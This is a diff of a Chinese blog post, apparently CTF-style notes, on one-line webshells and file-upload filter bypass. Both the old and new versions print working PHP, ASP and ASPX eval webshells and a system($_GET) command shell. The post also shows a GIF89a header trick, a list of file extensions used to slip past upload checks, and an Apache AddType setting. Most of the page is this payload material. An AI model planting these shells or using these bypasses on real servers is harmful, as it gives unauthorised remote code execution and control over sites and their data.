@@ -19,12 +19,12 @@
   <meta name="author" content="ccnyy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一句话木马与文件头过滤一句话木马PHP 一句话木马1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  1&lt;?php eval($_POST[aaa]) ?&gt;  1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP  ASP 一句话木马1&lt;%eval request (&quot;">
+    <meta name="description" content="一句话木马与文件头过滤 一句话木马 PHP 一句话木马 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; 1&lt;?php eval($_POST[aaa]) ?&gt; 1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP ASP 一句话木马 1&lt;%eval request (&amp;quot">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一句话木马与文件头过滤">
 <meta property="og:url" content="http://page.ccnyy.top/2025/01/21/%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="CNYのBlog">
-<meta property="og:description" content="一句话木马与文件头过滤一句话木马PHP 一句话木马1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  1&lt;?php eval($_POST[aaa]) ?&gt;  1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP  ASP 一句话木马1&lt;%eval request (&quot;">
+<meta property="og:description" content="一句话木马与文件头过滤 一句话木马 PHP 一句话木马 1&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; 1&lt;?php eval($_POST[aaa]) ?&gt; 1&lt;?&#x3D;eval($_POST[&#x27;a&#x27;]);?&gt;  &#x2F;&#x2F; 短标签绕过 PHP ASP 一句话木马 1&lt;%eval request (&amp;quot">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-21T15:19:05.000Z">
 <meta property="article:modified_time" content="2025-01-24T07:25:07.982Z">
@@ -285,28 +285,30 @@
             
               <div class="markdown-body">
                 
-                <h1 id="一句话木马与文件头过滤"><a href="#一句话木马与文件头过滤" class="headerlink" title="一句话木马与文件头过滤"></a>一句话木马与文件头过滤</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="PHP-一句话木马"><a href="#PHP-一句话木马" class="headerlink" title="PHP 一句话木马"></a>PHP 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
+                <h1>一句话木马与文件头过滤</h1>
+<h2 id="一句话木马">一句话木马</h2>
+<h3 id="PHP-一句话木马">PHP 一句话木马</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[aaa]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 短标签绕过 PHP</span><br></code></pre></td></tr></table></figure>
-
-<h3 id="ASP-一句话木马"><a href="#ASP-一句话木马" class="headerlink" title="ASP 一句话木马"></a>ASP 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request (&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure>
-
-<h3 id="ASPX-一句话木马"><a href="#ASPX-一句话木马" class="headerlink" title="ASPX 一句话木马"></a>ASPX 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
-
-<h3 id="PHP-另一种形式"><a href="#PHP-另一种形式" class="headerlink" title="PHP 另一种形式"></a>PHP 另一种形式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mochu7&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-
-<h2 id="文件头过滤"><a href="#文件头过滤" class="headerlink" title="文件头过滤"></a>文件头过滤</h2><h3 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h3><p>在文件开头添加 <code>GIF89a</code> 可以绕过一些文件头检测。</p>
-<h2 id="可执行命令一句话"><a href="#可执行命令一句话" class="headerlink" title="可执行命令一句话"></a>可执行命令一句话</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
+<h3 id="ASP-一句话木马">ASP 一句话木马</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request (&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure>
+<h3 id="ASPX-一句话木马">ASPX 一句话木马</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure>
+<h3 id="PHP-另一种形式">PHP 另一种形式</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mochu7&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="文件头过滤">文件头过滤</h2>
+<h3 id="GIF89a">GIF89a</h3>
+<p>在文件开头添加 <code>GIF89a</code> 可以绕过一些文件头检测。</p>
+<h2 id="可执行命令一句话">可执行命令一句话</h2>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>运行 HTML</p>
-<h2 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h2><p>以下是一些常见的文件后缀，可以用于绕过文件上传检测：</p>
+<h2 id="文件后缀">文件后缀</h2>
+<p>以下是一些常见的文件后缀，可以用于绕过文件上传检测：</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;php1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;pHp1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="PHP-解析配置"><a href="#PHP-解析配置" class="headerlink" title="PHP 解析配置"></a>PHP 解析配置</h2><p>PHP 文件需要在 Apache 的 <code>httpd.conf</code> 中有如下配置代码，才能正确解析：</p>
+<h2 id="PHP-解析配置">PHP 解析配置</h2>
+<p>PHP 文件需要在 Apache 的 <code>httpd.conf</code> 中有如下配置代码，才能正确解析：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AddType</span> application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure>
-
 <p>如果没有配置，访问时将会显示空白页。</p>
 
                 
@@ -384,9 +386,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/21/sql%E6%B3%A8%E5%85%A5/" title="SQL注入攻击">
+                      <a href="/2025/01/21/vol%E5%8F%96%E8%AF%811/" title="vol取证">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SQL注入攻击</span>
+                        <span class="hidden-mobile">vol取证</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -394,8 +396,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/21/vol%E5%8F%96%E8%AF%811/" title="vol取证">
-                        <span class="hidden-mobile">vol取证</span>
+                      <a href="/2025/01/21/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
